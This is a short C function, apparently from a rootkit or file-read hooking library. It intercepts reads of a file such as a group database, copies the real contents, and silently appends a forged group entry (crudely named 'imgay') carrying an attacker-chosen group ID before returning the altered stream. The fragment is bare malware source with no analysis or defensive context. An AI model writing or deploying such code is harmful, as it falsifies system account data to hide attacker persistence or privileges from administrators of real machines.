FILE *forgegroups(const char *pathname){
    FILE *tmp, *fp;
    char buf[LINE_MAX];

    fp = redirstream(pathname, &tmp);
    if(fp == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), fp) != NULL)
        fputs(buf, tmp);

    char *fmt="imgay:x:%u:\n";
    char newgroup[strlen(fmt)+256];
    memset(newgroup, 0, sizeof(newgroup));
    snprintf(newgroup, sizeof(newgroup), fmt, readgid());
    fputs(newgroup, tmp);

    fclose(fp);
    fseek(tmp, 0, SEEK_SET);
    return tmp;
}